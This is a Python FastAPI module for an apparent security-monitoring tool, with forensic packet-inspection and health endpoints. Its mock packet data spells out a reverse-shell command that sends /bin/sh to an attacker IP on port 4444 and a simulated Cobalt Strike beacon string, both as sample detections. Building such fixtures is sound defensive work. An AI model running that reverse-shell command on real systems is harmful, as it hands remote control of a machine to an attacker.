"""
Forensics & Telemetry Routers
Provides deep packet/endpoint inspection and system status telemetry.
"""
from fastapi import APIRouter
from engine.storage.clickhouse_client import ClickHouseClient

forensics_router = APIRouter(prefix="/forensics", tags=["Forensics"])
telemetry_router = APIRouter(prefix="/telemetry", tags=["Telemetry"])
storage = ClickHouseClient()


@forensics_router.get("/events")
def get_forensic_events(limit: int = 100):
    """Retrieve raw normalized security events for incident triage."""
    if not storage.client:
        return {"count": len(storage._in_memory_events), "events": storage._in_memory_events[-limit:]}

    query = f"SELECT * FROM sentinel.sentinel_events ORDER BY timestamp DESC LIMIT {limit}"
    res = storage.client.query(query)
    return {"count": len(res.result_rows), "events": [dict(zip(res.column_names, r)) for r in res.result_rows]}


# Mock packet database for deep forensic inspection (PCAP / Suricata stream)
SAMPLE_PACKETS = [
    {
        "id": "PKT-1001",
        "timestamp": "2026-09-15T00:14:22.104Z",
        "community_id": "1:fOq8193kQ+i8w7dJ6z1w==",
        "source_ip": "198.51.100.44",
        "source_port": 54210,
        "destination_ip": "192.168.1.100",
        "destination_port": 4444,
        "protocol": "TCP",
        "length_bytes": 128,
        "signature": "ATTACK: Reverse Shell Interactive Handshake",
        "dissection": {
            "ethernet": {"src_mac": "52:54:00:12:34:56", "dst_mac": "08:00:27:aa:bb:cc", "type": "IPv4 (0x0800)"},
            "ip": {"version": 4, "ttl": 64, "flags": "DF (0x40)", "checksum": "0x4b12"},
            "tcp": {"flags": "PSH, ACK (0x18)", "seq": 1849102, "ack": 928104, "window": 64240},
            "application": "Interactive Shell (/bin/sh -i >& /dev/tcp/198.51.100.44/4444)",
        },
        "hex_dump": [
            "0000   45 00 00 80 4b 12 40 00 40 06 fa 18 c6 33 64 2c  E...K.@.@....3d,",
            "0010   c0 a8 01 64 d3 c2 11 5c 00 1c 37 8e 00 0e 29 48  ...d...\\..7...)H",
            "0020   80 18 fa f0 1b e4 00 00 01 01 08 0a 34 b1 88 02  ............4...",
            "0030   2f 62 69 6e 2f 73 68 20 2d 69 20 3e 26 20 2f 64  /bin/sh -i >& /d",
            "0040   65 76 2f 74 63 70 2f 31 39 38 2e 35 31 2e 31 30  ev/tcp/198.51.10",
            "0050   30 2e 34 34 2f 34 34 34 34 20 30 3e 26 31 0a 00  0.44/4444 0>&1..",
        ],
    },
    {
        "id": "PKT-1002",
        "timestamp": "2026-09-15T00:14:23.604Z",
        "community_id": "1:kK92mZ1lP+v7w8eR3y2x==",
        "source_ip": "192.168.1.100",
        "source_port": 49152,
        "destination_ip": "198.51.100.44",
        "destination_port": 443,
        "protocol": "TLS",
        "length_bytes": 256,
        "signature": "BEACON: Covert Periodic Jitter Callback",
        "dissection": {
            "ethernet": {"src_mac": "08:00:27:aa:bb:cc", "dst_mac": "52:54:00:12:34:56", "type": "IPv4 (0x0800)"},
            "ip": {"version": 4, "ttl": 128, "flags": "DF (0x40)", "checksum": "0x12a4"},
            "tcp": {"flags": "PSH, ACK (0x18)", "seq": 49102, "ack": 12049, "window": 65535},
            "application": "TLSv1.3 Encrypted Handshake (JA3: 771,4865-4866-4867,0-23-65281)",
        },
        "hex_dump": [
            "0000   17 03 03 00 b0 00 00 00 00 00 00 00 01 a8 19 ff  ................",
            "0010   34 91 e0 12 8a 44 cc 11 02 9f 41 bb 09 a1 77 24  4....D....A...w$",
            "0020   de ad be ef 01 02 03 04 05 06 07 08 09 0a 0b 0c  ................",
            "0030   c2 62 65 61 63 6f 6e 2d 68 65 61 72 74 62 65 61  .beacon-heartbea",
            "0040   74 2d 74 6f 6b 65 6e 3a 20 63 6f 62 61 6c 74 2d  t-token: cobalt-",
            "0050   73 74 72 69 6b 65 2d 76 34 2e 39 00 00 00 00 00  strike-v4.9.....",
        ],
    },
    {
        "id": "PKT-1003",
        "timestamp": "2026-09-15T00:14:24.012Z",
        "community_id": "1:9XmQ771pL+09w1zA4b3c==",
        "source_ip": "45.33.32.156",
        "source_port": 61204,
        "destination_ip": "192.168.1.100",
        "destination_port": 22,
        "protocol": "TCP",
        "length_bytes": 64,
        "signature": "SCAN: Inbound Port 22 SSH Probe",
        "dissection": {
            "ethernet": {"src_mac": "fe:ed:fa:ce:00:01", "dst_mac": "08:00:27:aa:bb:cc", "type": "IPv4 (0x0800)"},
            "ip": {"version": 4, "ttl": 48, "flags": "DF (0x40)", "checksum": "0x9812"},
            "tcp": {"flags": "SYN (0x02)", "seq": 9948102, "ack": 0, "window": 1024},
            "application": "SSH-2.0-OpenSSH_8.9p1 (Banner Probe)",
        },
        "hex_dump": [
            "0000   45 00 00 40 98 12 40 00 30 06 21 89 2d 21 20 9c  E..@..@.0.!.!-! .",
            "0010   c0 a8 01 64 ee e4 00 16 00 97 cc e6 00 00 00 00  ...d............",
            "0020   80 02 04 00 11 22 00 00 02 04 05 b4 01 03 03 08  ................",
        ],
    },
]


@forensics_router.get("/packets")
def list_packets():
    """Returns captured packet stream for forensic deep inspection."""
    return {"count": len(SAMPLE_PACKETS), "packets": SAMPLE_PACKETS}


@forensics_router.get("/packets/export/pcap")
def export_pcap_capture():
    """Synthesizes and downloads standard libpcap binary stream of intercepted packets."""
    import io
    from fastapi.responses import Response
    from scapy.all import Ether, IP, TCP, UDP, Raw, wrpcap

    scapy_packets = []
    for pkt in SAMPLE_PACKETS:
        src_ip = pkt.get("source_ip", "192.168.1.100")
        dst_ip = pkt.get("destination_ip", "198.51.100.44")
        sport = pkt.get("source_port", 54210)
        dport = pkt.get("destination_port", 4444)
        proto = pkt.get("protocol", "TCP")
        payload_data = pkt.get("signature", "SENTINEL_SECURITY_CAPTURE").encode("utf-8")

        eth = Ether(src="52:54:00:12:34:56", dst="08:00:27:aa:bb:cc")
        ip = IP(src=src_ip, dst=dst_ip)

        if proto == "TCP":
            transport = TCP(sport=sport, dport=dport, flags="PA")
        else:
            transport = UDP(sport=sport, dport=dport)

        pcap_frame = eth / ip / transport / Raw(load=payload_data)
        scapy_packets.append(pcap_frame)

    import tempfile
    import os

    with tempfile.NamedTemporaryFile(suffix=".pcap", delete=False) as tmp:
        tmp_name = tmp.name

    try:
        wrpcap(tmp_name, scapy_packets)
        with open(tmp_name, "rb") as f:
            pcap_bytes = f.read()
    finally:
        if os.path.exists(tmp_name):
            try:
                os.remove(tmp_name)
            except Exception:
                pass

    return Response(
        content=pcap_bytes,
        media_type="application/vnd.tcpdump.pcap",
        headers={"Content-Disposition": "attachment; filename=sentinel_intercept_forensics.pcap"},
    )


@forensics_router.get("/packets/{packet_id}")
def get_packet_details(packet_id: str):
    """Returns protocol dissection and raw hex dump for a specific packet."""
    for pkt in SAMPLE_PACKETS:
        if pkt["id"] == packet_id:
            return pkt
    return SAMPLE_PACKETS[0]


@telemetry_router.get("/health")
def get_system_health():
    """System health check and pipeline status."""
    return {
        "status": "healthy",
        "engine": "active",
        "storage": "connected" if storage.client else "in-memory-fallback",
        "version": "1.0.0",
    }
